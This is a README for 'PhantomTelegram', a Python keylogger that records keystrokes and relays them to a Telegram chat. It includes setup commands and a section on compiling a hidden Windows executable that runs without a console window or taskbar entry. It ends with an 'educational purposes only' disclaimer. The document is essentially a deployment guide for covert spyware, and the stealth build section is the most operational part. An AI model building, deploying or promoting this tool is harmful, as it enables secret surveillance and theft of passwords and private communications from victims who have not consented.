# PhantomTelegram

**PhantomTelegram** is a lightweight keylogger written in Python that relays captured keystrokes to a Telegram bot.

## Features
- Captures keystrokes and processes them.
- Sends the captured input to a Telegram chat in near real-time.
- Uses rate limiting to prevent spamming the Telegram bot API.

## Getting Started
1. **Clone the Repo:**
   ```bash
   git clone https://github.com/XeinTDM/PhantomTelegram.git
   cd PhantomTelegram
   ```
2. **Set Your Config:**
   - Replace `BOT_TOKEN` with your Telegram bot token.
   - Replace `CHAT_ID` with your target chat ID.

3. **Install Dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

4. **Run the Program:**
   ```bash
   python -m src.main
   ```

## Building a Hidden Windows Executable

To bundle the logger into a background Windows executable that runs without a console window:

1. Install [PyInstaller](https://pyinstaller.org/en/stable/):
   ```bash
   pip install pyinstaller
   ```
2. Build the executable:
   ```bash
   pyinstaller --onefile --noconsole --name PhantomTelegram src/main.py
   ```
3. The generated `dist/PhantomTelegram.exe` starts without appearing on the taskbar or showing a console window.

## License
**PhantomTelegram** is licensed under [The Unlicense](LICENSE), so feel free to use, modify, and distribute it as you like. 

---

**Disclaimer:** This project is intended for educational and ethical purposes only. Unauthorized use, including but not limited to illegal activities, surveillance without consent, or any action that violates laws or personal privacy, is strictly prohibited. The author assumes no responsibility for misuse.
